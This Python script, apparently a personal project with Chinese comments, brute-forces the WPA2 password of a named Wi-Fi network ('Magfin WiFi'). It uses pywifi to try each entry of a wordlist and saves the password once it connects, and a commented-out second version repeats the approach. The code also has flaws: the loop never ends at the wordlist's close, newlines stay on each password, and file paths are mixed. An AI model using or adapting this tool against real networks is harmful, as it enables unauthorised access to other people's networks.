'''
Author: xinhua.pei xinhua.pei@airudder.com
Date: 2022-08-04 12:02:06
LastEditors: xinhua.pei xinhua.pei@airudder.com
LastEditTime: 2022-08-04 13:57:53
FilePath: /Wifi password crack/main.py
Description: 

Copyright (c) 2022 by xinhua.pei xinhua.pei@airudder.com, All Rights Reserved. 
'''
password_diction_path = '/Users/peixinhua/Desktop/Wifi password crack/wifi password dictionary/wordlist.txt'

import time
import iface
# wifi crack frameworks
import pywifi

import pywifi
from pywifi import const # 引入一个常量
import time

def wifiConnect(wifiname,wifipassword):
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.disconnect()# 断开连接
    time.sleep(0.5)
    if ifaces.status() == const.IFACE_DISCONNECTED:
        profile = pywifi.Profile()# 创建WiFi连接文件
        profile.ssid = wifiname# WiFi的ssid，即wifi的名称
        profile.key = wifipassword# WiFi密码
        profile.akm.append(const.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk
        profile.auth = const.AUTH_ALG_OPEN # 开放网卡
        profile.cipher = const.CIPHER_TYPE_CCMP# 加密单元
        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件
        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件
        ifaces.connect(tep_profile) # 连接WiFi
        time.sleep(1.5)
        if ifaces.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
def main():
    print('开始破解：')
    file = open(password_diction_path,'r')#打开密码本
    # wifi_name=input('请输入所要破解的wifi的名字（请务必注意大小写）：')
    wifi_name = 'Magfin WiFi'
    while True:
        wifipwd = file.readline()
        try:
            bool = wifiConnect(wifi_name,wifipwd)
            if bool:
                print('正确密码为：'+wifipwd)
                fo=open('D:/wifikey/%s.txt'%wifi_name,'w')
                fo.write('该wifi的密码为：')
                fo.write(wifipwd)
                fo.close()
                break
            else:
               print('本次尝试的密码为：%s，状态：密码错误'%wifipwd)
        except:
            continue
    file.close()
if __name__=='__main__':
	main()

# wifi_name = 'Magfin WiFi'

# file = open(password_diction_path,'r',errors= 'ignore')

# wifi = pywifi.PyWiFi()
# # get first infinite network card
# iface = wifi.interfaces()[0]


# def isno():
#     iface.disconnect()
#     iface.status() in \
#         [0,2]

# def test_connect(findStr):  # 测试链接
#     profile = pywifi.Profile()  # 创建wifi链接文件
#     profile.ssid = wifi_name  # wifi名称
#     profile.auth = 0  # 网卡的开放，
#     profile.akm.append(4)  # wifi加密算法
#     profile.cipher = 3  # 加密单元
#     profile.key = findStr  # 密码
#     iface.remove_all_network_profiles()  # 删除所有的wifi文件
#     tmp_profile = iface.add_network_profile(profile)  # 设定新的链接文件
#     iface.connect(tmp_profile)  # 链接
#     time.sleep(1)
#     if iface.status() == 4:  # 判断是否连接上
#         isOK = True
#     else:
#         isOK = False
#     iface.disconnect()  # 断开
#     # time.sleep(1)
#     # 检查断开状态
#     assert iface.status() in \
#            [0, 2]
#     return isOK

# def readPassWord():
#     print("开始破解：")
#     while True:
#         try:
#             myStr = file.readline()
#             if not myStr:
#                 break
#             bool1 = test_connect(myStr)
#             if bool1:
#                 print("密码正确：", myStr)
#                 break
#             else:
#                 print("密码错误:" + myStr)
#         except:
#             continue

# if __name__ == '__main__':
#     isno()
#     readPassWord()